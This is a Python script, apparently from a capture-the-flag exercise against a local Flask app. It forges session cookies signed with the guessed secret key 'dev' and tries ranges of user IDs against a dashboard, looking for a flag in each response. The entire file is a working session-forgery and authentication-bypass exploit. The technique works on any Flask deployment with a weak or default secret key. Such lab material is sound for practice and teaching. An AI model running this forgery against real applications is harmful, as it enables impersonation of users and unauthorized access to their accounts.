import requests
import re
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Target URL
base_url = "http://127.0.0.1:32883"
dashboard_url = f"{base_url}/dashboard"

# Working secret key
secret_key = 'dev'

def forge_flask_session(secret_key, user_id):
    """Forge a Flask session cookie using itsdangerous"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        session_data = {'user_id': user_id}
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

print("[*] Testing user_ids with REDIRECTS DISABLED")
print("="*80)

# Test user_ids from different ranges
test_ranges = [
    range(1, 21),        # 1-20
    range(10000, 10021), # 10000-10020
    range(10030, 10036)  # 10030-10035
]

found_flag = False

for test_range in test_ranges:
    if found_flag:
        break
        
    for user_id in test_range:
        forged_cookie = forge_flask_session(secret_key, user_id)
        if forged_cookie:
            cookies = {'session': forged_cookie}
            # Disable redirects to see actual dashboard response
            response = requests.get(dashboard_url, cookies=cookies, allow_redirects=False, timeout=5)
            
            # Look for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            
            if response.status_code != 302:
                # Not a redirect - this is interesting
                print(f"\n[+] user_id={user_id} | Status: {response.status_code} | Length: {len(response.content)}B")
                print(f"[+] Response:\n{response.text}")
                
                if flag_match:
                    print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
                    found_flag = True
                    break
            elif flag_match:
                # Flag in redirect response
                print(f"\n[+] user_id={user_id} | Status: {response.status_code} (redirect)")
                print(f"[!] FLAG FOUND in redirect: {flag_match.group(0)}")
                print(f"[+] Full Response:\n{response.text}")
                found_flag = True
                break

if not found_flag:
    print("\n[-] No flag found in tested user_ids")
    print("[*] All responses were 302 redirects to login page")
    print("[*] This suggests the forged sessions are valid but user_ids don't exist or have special access requirement")

